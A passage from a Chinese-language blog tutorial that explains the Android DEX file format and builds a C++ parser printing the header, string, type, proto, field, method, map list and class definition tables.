baseAddr;     /* track memory overhead for auxillary structures */    int                 overhead;     /* additional app-specific data structures associated with the DEX */    //void*               auxData;&#125;;</code></pre><p>​        为方便使用仅保留部分字段，编写相关函数如下：通过字节 buffer 或文件路径创建 DexFile 类并初始化各个字段</p><pre><code class="language-c++">class DexFile &#123;    u1*           baseAddr&#123;nullptr&#125;;    DexHeader*    pHeader&#123;nullptr&#125;;    DexStringId*  pStringIds&#123;nullptr&#125;;    DexTypeId*    pTypeIds&#123;nullptr&#125;;    DexFieldId*   pFieldIds&#123;nullptr&#125;;    DexMethodId*  pMethodIds&#123;nullptr&#125;;    DexProtoId*   pProtoIds&#123;nullptr&#125;;    DexClassDef*  pClassDefs&#123;nullptr&#125;;    void initFields(unsigned char *buffer); &#125;// Init functionsvoid DexFile::initFields(unsigned char* buffer) &#123;    if(buffer==nullptr) &#123;        printf(&quot;Null pointer provided!\n&quot;);        exit(0);    &#125;    baseAddr=buffer;    pHeader=(DexHeader*)baseAddr;    pStringIds=(DexStringId*)(baseAddr+pHeader-&gt;stringIdsOff);    pTypeIds=(DexTypeId*)(baseAddr+pHeader-&gt;typeIdsOff);    pFieldIds=(DexFieldId*)(baseAddr+pHeader-&gt;fieldIdsOff);    pMethodIds=(DexMethodId*)(baseAddr+pHeader-&gt;methodIdsOff);    pProtoIds=(DexProtoId*)(baseAddr+pHeader-&gt;protoIdsOff);    pClassDefs=(DexClassDef*)(baseAddr+pHeader-&gt;classDefsOff);&#125;DexFile::DexFile(unsigned char *buffer) &#123;    initFields(buffer);&#125;DexFile::DexFile(std::string filePath) &#123;    size_t fileLength=0;    initFields(readFileToBytes(filePath, fileLength));&#125;DexFile::~DexFile() &#123;    delete baseAddr;&#125;</code></pre><hr><h4 id="Dex-Header"><a href="#Dex-Header" class="headerlink" title="Dex Header"></a>Dex Header</h4><p>Dex Header 定义如下：</p><pre><code class="language-c++">typedef struct DexHeader &#123;    u1  magic[8];           //Dex版本号 dex.035 .035即为版本号    u4  checksum;           //adler32检验,如果修改了Dex文件,需要修正这个值,否则会运行不起来    u1  signature[kSHA1DigestLen]; //SHA-1值,Android不检测该值,但如果修改了Dex文件,最好修复该值,再修checksum    u4  fileSize;           //整个dex文件的大小    u4  headerSize;         //DexHeader结构的大小,固定为0x70    u4  endianTag;          //字节序标记,若该字段按小端方式读出来为0x12345678,则整个Dex文件就是小端方式.如果按大端方式读出来为0x12345678,那整个Dex文件就是大端方式    u4  linkSize;           //链接段大小    u4  linkOff;            //链接段偏移    u4  mapOff;             //DexMapList文件偏移    u4  stringIdsSize;      //DexStringId个数    u4  stringIdsOff;       //DexStringId文件偏移    u4  typeIdsSize;        //DexTypeId个数    u4  typeIdsOff;         //DexTypeId文件偏移    u4  protoIdsSize;       //DexProtoId个数    u4  protoIdsOff;        //DexProtoId文件偏移    u4  fieldIdsSize;       //DexFieldId个数    u4  fieldIdsOff;        //DexFieldId文件偏移    u4  methodIdsSize;      //DexMethodId个数    u4  methodIdsOff;       //DexMethodId文件偏移    u4  classDefsSize;      //DexClassDef个数    u4  classDefsOff;       //DexClassDef文件偏移    u4  dataSize;           //数据段大小    u4  dataOff;            //数据段文件偏移&#125; DexHeader;</code></pre><p>打印 DexHeader</p><pre><code class="language-c++">void DexFile::printDexHeader() &#123;    printf(&quot;DexHeader:\n&quot;);    printf(&quot;\tmagic: &quot;);printHexBytes(pHeader-&gt;magic,sizeof(pHeader-&gt;magic));printf(&quot;\n&quot;);    printf(&quot;\tchecksum: %#x\n&quot;,pHeader-&gt;checksum);    printf(&quot;\tsignature: &quot;);printHexBytes(pHeader-&gt;signature,kSHA1DigestLen);printf(&quot;\n&quot;);    printf(&quot;\tFileSize: %#x\n&quot;,pHeader-&gt;fileSize);    printf(&quot;\tHeaderSize: %#x\n&quot;,pHeader-&gt;headerSize);    printf(&quot;\tEndianTag: %#x\n&quot;,pHeader-&gt;endianTag);    printf(&quot;\tLinkOff: %#x\n&quot;,pHeader-&gt;linkOff);    printf(&quot;\tLinkSize: %#x\n&quot;,pHeader-&gt;linkSize);    printf(&quot;\tMapOff: %#x\n&quot;,pHeader-&gt;mapOff);    printf(&quot;\tStringIDs Offset: %#x\n&quot;,pHeader-&gt;stringIdsOff);    printf(&quot;\tNum of StringIDs: %#x\n&quot;,pHeader-&gt;stringIdsSize);    printf(&quot;\tTypeIDs Offset: %#x\n&quot;,pHeader-&gt;typeIdsOff);    printf(&quot;\tNum of TypeIDs: %#x\n&quot;,pHeader-&gt;typeIdsSize);    printf(&quot;\tProtoIDs Offset: %#x\n&quot;,pHeader-&gt;protoIdsOff);    printf(&quot;\tNum of ProtoIDs: %#x\n&quot;,pHeader-&gt;protoIdsSize);    printf(&quot;\tFieldIDs Offset: %#x\n&quot;,pHeader-&gt;fieldIdsOff);    printf(&quot;\tNum of FieldIDs: %#x\n&quot;,pHeader-&gt;fieldIdsSize);    printf(&quot;\tMethodIDs Offset: %#x\n&quot;,pHeader-&gt;methodIdsOff);    printf(&quot;\tNum of MethodIDs: %#x\n&quot;,pHeader-&gt;methodIdsSize);    printf(&quot;\tClassDefs Offset: %#x\n&quot;,pHeader-&gt;classDefsOff);    printf(&quot;\tNum of ClassDefs: %#x\n&quot;,pHeader-&gt;classDefsSize);    printf(&quot;\tData Offset: %#x\n&quot;,pHeader-&gt;dataOff);    printf(&quot;\tSize of Data: %#x\n&quot;,pHeader-&gt;dataSize);    printf(&quot;DexHeader End\n&quot;);&#125;</code></pre><p>效果如下：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250825162311753.png" alt="image-20250825162311753"></p><h4 id="Dex-String-ID"><a href="#Dex-String-ID" class="headerlink" title="Dex String ID"></a>Dex String ID</h4><p>定义如下</p><pre><code class="language-c++">struct DexStringId &#123;    u4 stringDataOff;      /* 字符串的文件偏移量 */&#125;; //伪结构表示如下:struct string_data_item &#123; uleb128 utf16_size; //字符串长度 ubyte[] data;       //字符串数据&#125;</code></pre><p>注意 dex 文件的字符串采用 MUTF-8 编码，与 UTF-8 区别如下：</p><ol><li>MUTF-8 使用 1~ 3 字节编码；</li><li>大于 16 位的 Unicode 编码 U + 10000 ~ U + 10ffff 使用 3 字节编码；</li><li>U + 000 采用 2 字节编码；</li><li>以 0x00 空字符作为字符串结尾。</li></ol><p>MUTF-8 字符串头部保存的是字符串长度，是 uleb 128 类型。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250825171935170.png" alt="image-20250825171935170"></p><p>相关函数定义如下，解析 StringId</p><pre><code class="language-c++">// StringId functions// 通过索引获取对应StringIdDexStringId DexFile::getStringIdByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;stringIdsSize-1)) &#123;        return pStringIds[index];    &#125;    printf(&quot;No such index: %x\n&quot;,index);    exit(0);&#125;// 解析StringId 获取字符串长度size_t DexFile::getStringDataLength(DexStringId&amp; stringId) &#123;    const u1* ptr = baseAddr + stringId.stringDataOff;    size_t size=0;    myReadUnsignedLeb128(ptr,&amp;size);    return size;&#125;// 解析StringId 获取字符串std::string DexFile::getStringIdData(const DexStringId&amp; stringId) &#123;    const u1* ptr = baseAddr + stringId.stringDataOff;    while (*(ptr++) &gt; 0x7f);// Skip the uleb128 length.    return (char*)ptr;&#125;// 通过索引获取StringId的字符串std::string DexFile::getStringIdDataByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;stringIdsSize-1)) &#123;        return getStringIdData(pStringIds[index]);    &#125;    return nullptr;&#125;</code></pre><p>打印所有 StringId，没有做 MUTF 编码处理，直接打印 ASCII 字符串</p><pre><code class="language-c++">void DexFile::printStringIds() &#123;    printf(&quot;StringIds:\n&quot;);    printf(&quot;\tNums\t\tStrings\n&quot;);    for(int i=0;i&lt;pHeader-&gt;stringIdsSize;i++) &#123;        printf(&quot;\t%08x\t%s\n&quot;,i,getStringIdDataByIndex(i).c_str());    &#125;    printf(&quot;StringIds End\n&quot;);&#125;</code></pre><p>效果如下，没有做编码处理</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250825175158111.png" alt="image-20250825175158111"></p><h4 id="Dex-Type-ID"><a href="#Dex-Type-ID" class="headerlink" title="Dex Type ID"></a>Dex Type ID</h4><p>定义如下</p><pre><code class="language-c++">typedef struct DexTypeId &#123;    u4  descriptorIdx;     //指向DexStringId列表的索引&#125; DexTypeId;</code></pre><p>​        descriptorIdx 为 DexStringID 表的索引，对应字符串表示类的类型。</p><p>​        例如，此处，type_id[4].descriptor_idx &#x3D; 0xA，而在 dex_string_ids 中，string_id[10] 对应的字符串就是 “Ljava&#x2F;lang&#x2F;String;”</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250826164356919.png" alt="image-20250826164356919"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250826164422103.png" alt="image-20250826164422103"></p><p>​        和 StringId 类似，TypeId 的解析代码如下，通过索引获取 StringId 及其对应的字符串。</p><pre><code class="language-c++">// TypeId functions// 通过索引获取对应TypeIdDexTypeId DexFile::getTypeIdByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;typeIdsSize-1)) &#123;        return pTypeIds[index];    &#125;    printf(&quot;No such index: %x\n&quot;,index);    exit(0);&#125;// 通过索引获取TypeId对应的字符串std::string DexFile::getTypeIdDataByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;typeIdsSize-1)) &#123;        return getStringIdDataByIndex(pTypeIds[index].descriptorIdx);    &#125;    return nullptr;&#125;</code></pre><p>打印所有 TypeId</p><pre><code class="language-c++">void DexFile::printTypeIds() &#123;    printf(&quot;TypeIds:\n&quot;);    printf(&quot;\tNums\t\tTypeIds\n&quot;);    for(int i=0;i&lt;pHeader-&gt;typeIdsSize;i++) &#123;        printf(&quot;\t%08x\t%s\n&quot;,i,getTypeIdDataByIndex(i).c_str());    &#125;    printf(&quot;TypeIds End\n&quot;);&#125;</code></pre><p>效果如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250826173450909.png" alt="image-20250826173450909"></p><h4 id="Dex-Proto-ID"><a href="#Dex-Proto-ID" class="headerlink" title="Dex Proto ID"></a>Dex Proto ID</h4><p>​        DexProtoId 是 **方法声明（方法签名）**的结构体，保存方法（函数）的返回值类型和参数类型列表，没有函数名，定义如下：</p><pre><code class="language-c++">typedef struct DexProtoId &#123;    u4  shortyIdx;          //方法声明字符串,指向DexStringId列表的索引    u4  returnTypeIdx;      //方法返回类型字符串,指向DexTypeId列表的索引    u4  parametersOff;      //方法的参数列表,指向DexTypeList列表的索引&#125; DexProtoId;</code></pre><p>​        <strong>parametersOff</strong> 是 DexTypeList 的文件偏移。</p><h5 id="DexTypeList"><a href="#DexTypeList" class="headerlink" title="DexTypeList"></a>DexTypeList</h5><p>结构定义如下</p><pre><code class="language-c++">typedef struct DexTypeList &#123;    u4  size;               //DexTypeItem个数, 即参数个数    DexTypeItem list[size]; //DexTypeItem数组, 按从左到右的顺序保存了方法的参数&#125; DexTypeList; typedef struct DexTypeItem &#123;    u2  typeIdx;           //指向DexTypeId列表的索引&#125; DexTypeItem;</code></pre><p>例如此处 DexProtoID[1]</p><p>方法声明 DexStringID[shorty_idx] &#x3D; “L”</p><p>返回类型 DexStringID[DexType[return_type_idx]] &#x3D; “Ljava&#x2F;lang&#x2F;String;”</p><p>这里的偏移是 0，所以就没有后续了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250826174812171.png" alt="image-20250826174812171"></p><p>解析代码如下</p><pre><code class="language-c++">// ProtoId functionsconst DexProtoId DexFile::getProtoIdByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;protoIdsSize-1)) &#123;        return pProtoIds[index];    &#125;    illegalIndex(index);&#125;std::string DexFile::getProtoIdShorty(const DexProtoId&amp; protoId) &#123;    return getStringIdDataByIndex(protoId.shortyIdx);&#125;std::string DexFile::getProtoIdReturnType(const DexProtoId&amp; protoId) &#123;    return getTypeIdDataByIndex(protoId.returnTypeIdx);&#125;// 获取ProtoId的参数列表,解析TypeList结构std::vector&lt;std::string&gt; DexFile::getProtoIdParameters(const DexProtoId&amp; protoId) &#123;    std::vector&lt;std::string&gt; parameters;    //无参数    if(protoId.parametersOff==0) &#123;        return parameters;    &#125;    //解析TypeList结构 获取参数列表    DexTypeList* typeList=(DexTypeList*)(baseAddr+protoId.parametersOff);    for(int i=0;i&lt;typeList-&gt;size;i++) &#123;        parameters.push_back(getTypeIdDataByIndex(typeList-&gt;list[i].typeIdx));    &#125;    return parameters;&#125;// 解析DexProtoId结构体 返回解析后的字符串std::string DexFile::parseProtoId(const DexProtoId&amp; protoId) &#123;    std::string shorty=getProtoIdShorty(protoId);//c++的string类型会自动遍历const char*字符串并复制    std::string return_type = getProtoIdReturnType(protoId);    std::vector&lt;std::string&gt; parameters=getProtoIdParameters(protoId);     std::string result;    result+=parseString(return_type)+&quot; (&quot;;    //解析参数    for(int i=0;i&lt;parameters.size();i++) &#123;        result+=parseString(parameters[i]);        if(i!=parameters.size()-1)//多个参数以,分隔            result+=&quot;,&quot;;    &#125;    result+=&quot;)&quot;;    return result;&#125;// 通过索引解析ProtoId,返回解析后的对应字符串std::string DexFile::getProtoIdDataByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;protoIdsSize-1)) &#123;        return parseProtoId(getProtoIdByIndex(index));    &#125;    return nullptr;&#125;</code></pre><p>打印所有 ProtoId</p><pre><code class="language-c++">void DexFile::printProtoIds() &#123;    printf(&quot;ProtoIds:\n&quot;);    printf(&quot;\tNums\t\tProtoIds\n&quot;);    for(int i=0;i&lt;pHeader-&gt;protoIdsSize;i++) &#123;        printf(&quot;\t%08x\t%s\n&quot;,i,getProtoIdDataByIndex(i).c_str());    &#125;    printf(&quot;ProtoIds End\n&quot;);&#125;</code></pre><p>效果如下</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250826180127319.png" alt="image-20250826180127319"></p><h4 id="Dex-Field-ID"><a href="#Dex-Field-ID" class="headerlink" title="Dex Field ID"></a>Dex Field ID</h4><p>​        <strong>DexFiledID</strong> 结构体指明了成员变量所在的类，类型以及变量名。</p><pre><code class="language-c++">typedef struct DexFieldId &#123;    u2  classIdx;           //类的类型,指向DexTypeId列表的索引    u2  typeIdx;            //字段类型,指向DexTypeId列表的索引    u4  nameIdx;            //字段名,指向DexStringId列表的索引&#125; DexFieldId;</code></pre><p>​        寻找方法类似，out 是 java.lang.System 类的成员，类型为 java.io.PrintStream。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827094208844.png" alt="image-20250827094208844"></p><p>解析代码如下</p><pre><code class="language-c++">// FieldId functionsconst DexFieldId DexFile::getFieldIdByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;fieldIdsSize-1)) &#123;        return pFieldIds[index];    &#125;    illegalIndex(index);&#125;// 获取FieldId所在类类名std::string DexFile::getFieldIdClass(const DexFieldId&amp; fieldId) &#123;    return getTypeIdDataByIndex(fieldId.classIdx);&#125;// 获取FieldId类型std::string DexFile::getFieldIdType(const DexFieldId&amp; fieldId) &#123;    return getTypeIdDataByIndex(fieldId.typeIdx);&#125;// 获取FieldId名称std::string DexFile::getFieldIdName(const DexFieldId&amp; fieldId) &#123;    return getStringIdDataByIndex(fieldId.nameIdx);&#125;// 解析DexFieldId结构,字段所在类,类型,名称std::string DexFile::parseFieldId(const DexFieldId&amp; fieldId) &#123;    std::string fieldClass=getFieldIdClass(fieldId);    std::string fieldType=getFieldIdType(fieldId);    std::string fieldName=getFieldIdName(fieldId);    return parseString(fieldType)+&quot; &quot;+parseString(fieldClass)+&quot;.&quot;+fieldName;&#125;// 通过索引获取FieldId对应的字符串std::string DexFile::getFieldIdDataByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;fieldIdsSize-1)) &#123;        return parseFieldId(getFieldIdByIndex(index));    &#125;    return nullptr;&#125;</code></pre><p>打印所有 FieldID</p><pre><code class="language-c++">void DexFile::printFieldIds() &#123;    printf(&quot;FieldIds:\n&quot;);    printf(&quot;\tNums\t\tFieldIds\n&quot;);    for(int i=0;i&lt;pHeader-&gt;fieldIdsSize;i++) &#123;        printf(&quot;\t%08x\t%s\n&quot;,i,getFieldIdDataByIndex(i).c_str());    &#125;    printf(&quot;FieldId End\n&quot;);&#125;</code></pre><p>效果如下：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827095302390.png" alt="image-20250827095302390"></p><h4 id="Dex-Method-ID"><a href="#Dex-Method-ID" class="headerlink" title="Dex Method ID"></a>Dex Method ID</h4><p>​        <strong>DexMethodID</strong> 结构体指明了方法所在类、方法声明（签名）以及方法名，即完整的方法声明，</p><pre><code class="language-c++">struct DexMethodId &#123;    u2  classIdx;           /* 方法的所属的类，指向DexTypeId列表的索引 */    u2  protoIdx;           /* 声明类型，指向DexProtoId列表的索引 */    u4  nameIdx;            /* 方法名，指向DexStringId列表的索引 */&#125;;</code></pre><p>寻找方法，屏幕大小有限，DexMethodID 那里没截完<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827095615969.png" alt="image-20250827095615969"></p><p>对应解析代码如下：</p><pre><code class="language-c++">// MethodId functionsconst DexMethodId DexFile::getMethodIdByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;methodIdsSize-1)) &#123;        return pMethodIds[index];    &#125;    illegalIndex(index);&#125;// 获取MethodId所在类名std::string DexFile::getMethodIdClass(const DexMethodId&amp; methodId) &#123;    return getTypeIdDataByIndex(methodId.classIdx);&#125;// 获取MethodId对应方法签名std::string DexFile::getMethodIdProto(const DexMethodId&amp; methodId) &#123;    return getProtoIdDataByIndex(methodId.protoIdx);&#125;// 获取MethodId对应方法名std::string DexFile::getMethodIdName(const DexMethodId&amp; methodId) &#123;    return getStringIdDataByIndex(methodId.nameIdx);&#125;// 解析DexMethodId结构std::string DexFile::parseMethodId(const DexMethodId&amp; methodId) &#123;    std::string methodProto=getMethodIdProto(methodId);    //解析class并拼接name    std::string methodFullName=parseString(getMethodIdClass(methodId))+getMethodIdName(methodId);    //拼接proto和class.name    return methodProto.insert(methodProto.find(&#39; &#39;)+1,methodFullName);&#125;// 通过索引获取MethodId对应字符串std::string DexFile::getMethodIdDataByIndex(u4 index) &#123;    if(checkIndexIsLegal(index,pHeader-&gt;methodIdsSize-1)) &#123;        return parseMethodId(getMethodIdByIndex(index));    &#125;    return nullptr;&#125;</code></pre><p>打印所有 MethodID</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827095834259.png" alt="image-20250827095834259"></p><h4 id="Dex-Map-List"><a href="#Dex-Map-List" class="headerlink" title="Dex Map List"></a>Dex Map List</h4><p>​        Dalvik 虚拟机解析 dex 文件后，映射为 DexMapList 的数据结构，该结构由 <strong>DexHeader.mapOff</strong> 指明位置。</p><pre><code class="language-c++">struct DexMapList &#123;    u4  size;               /* DexMapItem个数 */    DexMapItem list[1];     /* DexMapItem数组 */&#125;; struct DexMapItem &#123;    u2 type;              /* KDexType开头的类型 */    u2 unused;            /* 未使用，用于字节对齐 */    u4 size;              /* 类型的个数 */    u4 offset;            /* 类型数据的文件偏移 */&#125;;</code></pre><p>type 是枚举常量，用于判断类型</p><pre><code class="language-c++">/* map item type codes */enum &#123;    kDexTypeHeaderItem               = 0x0000,    kDexTypeStringIdItem             = 0x0001,    kDexTypeTypeIdItem               = 0x0002,    kDexTypeProtoIdItem              = 0x0003,    kDexTypeFieldIdItem              = 0x0004,    kDexTypeMethodIdItem             = 0x0005,    kDexTypeClassDefItem             = 0x0006,    kDexTypeCallSiteIdItem           = 0x0007,    kDexTypeMethodHandleItem         = 0x0008,    kDexTypeMapList                  = 0x1000,    kDexTypeTypeList                 = 0x1001,    kDexTypeAnnotationSetRefList     = 0x1002,    kDexTypeAnnotationSetItem        = 0x1003,    kDexTypeClassDataItem            = 0x2000,    kDexTypeCodeItem                 = 0x2001,    kDexTypeStringDataItem           = 0x2002,    kDexTypeDebugInfoItem            = 0x2003,    kDexTypeAnnotationItem           = 0x2004,    kDexTypeEncodedArrayItem         = 0x2005,    kDexTypeAnnotationsDirectoryItem = 0x2006,&#125;;</code></pre><p>​        <strong>size</strong> 指定了类型的个数，在 dex 文件中连续存放，offset 是起始地址文件偏移。</p><p>​        例如此处，DexMapList[1] type &#x3D; TYPE_STRING_ID_ITEM，size &#x3D; 0x1A，offset &#x3D; 0x70，和 DexStringID 表正好对应，起始地址，表项数。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827101509554.png" alt="image-20250827101509554"></p><p>解析代码如下</p><pre><code class="language-c++">void DexFile::printMapList() &#123;    static std::map&lt;int, std::string&gt; MapItemTypeToStringMap = &#123;        &#123;kDexTypeHeaderItem, &quot;HeaderItem&quot;&#125;,        &#123;kDexTypeStringIdItem, &quot;StringIdItem&quot;&#125;,        &#123;kDexTypeTypeIdItem, &quot;TypeIdItem&quot;&#125;,        &#123;kDexTypeProtoIdItem, &quot;ProtoIdItem&quot;&#125;,        &#123;kDexTypeFieldIdItem, &quot;FieldIdItem&quot;&#125;,        &#123;kDexTypeMethodIdItem, &quot;MethodIdItem&quot;&#125;,        &#123;kDexTypeClassDefItem, &quot;ClassDefItem&quot;&#125;,        &#123;kDexTypeMapList, &quot;MapList&quot;&#125;,        &#123;kDexTypeTypeList, &quot;TypeList&quot;&#125;,        &#123;kDexTypeAnnotationSetRefList, &quot;AnnotationSetRefList&quot;&#125;,        &#123;kDexTypeAnnotationSetItem, &quot;AnnotationSetItem&quot;&#125;,        &#123;kDexTypeClassDataItem, &quot;ClassDataItem&quot;&#125;,        &#123;kDexTypeCodeItem, &quot;CodeItem&quot;&#125;,        &#123;kDexTypeStringDataItem, &quot;StringDataItem&quot;&#125;,        &#123;kDexTypeDebugInfoItem, &quot;DebugInfoItem&quot;&#125;,        &#123;kDexTypeAnnotationItem, &quot;AnnotationItem&quot;&#125;,        &#123;kDexTypeEncodedArrayItem, &quot;EncodedArrayItem&quot;&#125;,        &#123;kDexTypeAnnotationsDirectoryItem, &quot;AnnotationsDirectoryItem&quot;&#125;    &#125;;     DexMapList* pMapList=(DexMapList*)(baseAddr+pHeader-&gt;mapOff);    DexMapItem* pMapItems=pMapList-&gt;list;    printf(&quot;MapList has %d items, start at: %#x\n&quot;,pMapList-&gt;size,pHeader-&gt;mapOff);    printf(&quot;Nums\t\tType\t\t\t\tItemNums\tStartOff\n&quot;);    for(int i=0;i&lt;pMapList-&gt;size;i++) &#123;        // 解析MapType        auto it=MapItemTypeToStringMap.find(pMapItems[i].type);        std::string mapType;        if(it!= MapItemTypeToStringMap.end())            mapType=it-&gt;second;        else mapType=&quot;Unknown Type&quot;;        printf(&quot;%08d\t%-24s\t%08d\t%08x\n&quot;,i+1,mapType.c_str(),pMapItems[i].size,pMapItems[i].offset);    &#125;    printf(&quot;MapList End\n&quot;);&#125;</code></pre><p>打印效果如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250827101804404.png" alt="image-20250827101804404"></p><h4 id="Dex-Class-Def"><a href="#Dex-Class-Def" class="headerlink" title="Dex Class Def"></a>Dex Class Def</h4><p>​        该结构较为复杂（这部分相关代码比前文所有结构代码之和都大）。有了对 Dex 文件的基本了解和上面各个结构的基础，才能解析该结构。</p><p>​        <strong>DexClassDef</strong> 保存了的相关信息，定义如下</p><pre><code class="language-c++">struct DexClassDef &#123;    u4  classIdx;           /* 类的类型（即全限定类名），指向DexTypeId列表的索引 */    u4  accessFlags;        /* 访问标志，以ACC_开头的枚举值，如ACC_PUBLIC（0x1）、ACC_PRIVATE（0x2）*/    u4  superclassIdx;      /* 父类类型，指向DexTypeId列表的索引*/    u4  interfacesOff;      /* 接口，指向DexTypeList的文件偏移，如果类中不含有接口声明和实现，则值为0 */    u4  sourceFileIdx;      /* 类所在源文件的文件名，指向DexStringId列表的索引 */    u4  annotationsOff;     /* 注解，指向DexAnnotationsDirectoryItem结构体，根据类型不同会有注解类、注解方法、注解字段与注解参数，如果类中没有注解，则值为0 */    u4  classDataOff;       /* 指向DexClassData结构的文件偏移，DexClassData结构是类的数据部分 */    u4  staticValuesOff;    /* 指向DexEncodedArray结构的文件偏移，记录类中的静态数据, 没有则为0 */&#125;;</code></pre><p>​        解析代码如下：将 <strong>ClassDef</strong> 结构划分为 4 部分解析：<strong>BasicInfo</strong>、<strong>Annotations</strong>、<strong>ClassData</strong>、<strong>StaticValues</strong>，从 classIdx 到 sourceFileIdx 属于 BasicInfo。每部分使用单独的打印函数进行处理。</p><pre><code class="language-c++">// 打印所有ClassDef信息void DexFile::printClassDefs() &#123;    printf(&quot;ClassDefs:\n&quot;);    for(int i=0;i&lt;pHeader-&gt;classDefsSize;i++) &#123;        DexClassDef classDef=pClassDefs[i];        // 1.Basic info        printf(&quot;=========================ClassDef %08d=========================\n&quot;,i+1);        printClassDefBasicInfo(classDef);         // 2. Annotations        if(classDef.annotationsOff) &#123;            printf(&quot;Annotations:\n&quot;);            printClassDefAnnotations(*(DexAnnotationsDirectoryItem*)(baseAddr+classDef.annotationsOff));                // 值传递只保留前16字节导致内存访问错,需要引用传递                // DexAnnotationsDirectoryItem annotations_directory_item=*(DexAnnotationsDirectoryItem*)(baseAddr+classDef.annotationsOff);                // parseClassDefAnnotations(annotations_directory_item);        &#125;        else            printf(&quot;No Annotations\n&quot;);        // 3. ClassData        if(classDef.classDataOff) &#123;            printClassDefClassData(*(DexClassData*)(baseAddr+classDef.classDataOff));        &#125;else            printf(&quot;No ClassData\n&quot;);        // 4. StaticValues        if(classDef.staticValuesOff) &#123;            printClassDefStaticValues(*(DexEncodedArray*)(baseAddr+classDef.staticValuesOff));        &#125;else            printf(&quot;No StaticValues\n&quot;);        printf(&quot;===================================================================\n&quot;);    &#125;    printf(&quot;ClassDefs End\n&quot;);&#125;</code></pre><h5 id="ClassDefBasicInfo"><a href="#ClassDefBasicInfo" class="headerlink" title="ClassDefBasicInfo"></a>ClassDefBasicInfo</h5><p>代码如下</p><pre><code class="language-c++">// ClassDef Basic Info functions// 获取classstd::string DexFile::getClassDefClass(DexClassDef&amp; classDef) &#123;    return parseString(getTypeIdDataByIndex(classDef.classIdx));&#125;// 解析权限修饰符std::string DexFile::parseAccessFlags(u4 accessFlags) &#123;    static std::map&lt;int, std::string&gt; AccessFlagMap = &#123;        &#123;ACC_PUBLIC, &quot;public&quot;&#125;,        &#123;ACC_PRIVATE, &quot;private&quot;&#125;,        &#123;ACC_PROTECTED, &quot;protected&quot;&#125;,        &#123;ACC_STATIC, &quot;static&quot;&#125;,        &#123;ACC_FINAL, &quot;final&quot;&#125;,        &#123;ACC_SYNCHRONIZED, &quot;synchronized&quot;&#125;,        &#123;ACC_SUPER, &quot;super&quot;&#125;,        &#123;ACC_VOLATILE, &quot;volatile&quot;&#125;,        &#123;ACC_BRIDGE, &quot;bridge&quot;&#125;,        &#123;ACC_TRANSIENT, &quot;transient&quot;&#125;,        &#123;ACC_VARARGS, &quot;varargs&quot;&#125;,        &#123;ACC_NATIVE, &quot;native&quot;&#125;,        &#123;ACC_INTERFACE, &quot;interface&quot;&#125;,        &#123;ACC_ABSTRACT, &quot;abstract&quot;&#125;,        &#123;ACC_STRICT, &quot;strict&quot;&#125;,        &#123;ACC_SYNTHETIC, &quot;synthetic&quot;&#125;,        &#123;ACC_ANNOTATION, &quot;annotation&quot;&#125;,        &#123;ACC_ENUM, &quot;enum&quot;&#125;,        &#123;ACC_CONSTRUCTOR, &quot;constructor&quot;&#125;,        &#123;ACC_DECLARED_SYNCHRONIZED, &quot;declared_synchronized&quot;&#125;    &#125;;    std::string result;    for(int i=0;i&lt;32;i++) &#123;        if(accessFlags &amp; (1 &lt;&lt; i)) &#123;            result+=AccessFlagMap[1 &lt;&lt; i]+&quot; &quot;;//遍历添加权限控制属性        &#125;    &#125;    if(!result.empty())        result=result.substr(0,result.length()-1);//去除末尾多余空格    return result;&#125;// 获取父类std::string DexFile::getClassDefSuperClass(DexClassDef&amp; classDef) &#123;    return parseString(getTypeIdDataByIndex(classDef.superclassIdx));&#125;// 获取接口列表std::vector&lt;std::string&gt; DexFile::getClassDefInterfaces(DexClassDef&amp; classDef) &#123;    std::vector&lt;std::string&gt; interfaces;    //无参数    if(classDef.interfacesOff==0) &#123;        return interfaces;    &#125;    DexTypeList* typeList=(DexTypeList*)(baseAddr+classDef.interfacesOff);    for(int i=0;i&lt;typeList-&gt;size;i++) &#123;        interfaces.push_back(getTypeIdDataByIndex(typeList-&gt;list[i].typeIdx));    &#125;    return interfaces;&#125;// 获取源文件std::string DexFile::getClassDefSourceFile(DexClassDef&amp; classDef) &#123;    return getStringIdDataByIndex(classDef.sourceFileIdx);&#125;// 打印ClassDef结构的基本信息: 类名 父类 源文件名 接口void DexFile::printClassDefBasicInfo(DexClassDef&amp; classDef) &#123;    std::string className=getClassDefClass(classDef);    std::string accessFlags=parseAccessFlags(classDef.accessFlags);    std::string superClass=getClassDefSuperClass(classDef);    std::vector&lt;std::string&gt; interfaces=getClassDefInterfaces(classDef);    std::string sourceFile=getClassDefSourceFile(classDef);     // Basic info, class super_class source_file interfaces    printf(&quot;Class:\t\t%s\n&quot;,combineAccFlagsAndName(accessFlags,className).c_str());    printf(&quot;Super Class:\t%s\n&quot;,superClass.c_str());    printf(&quot;Source File:\t%s\n&quot;,sourceFile.c_str());     // print interfaces if have it    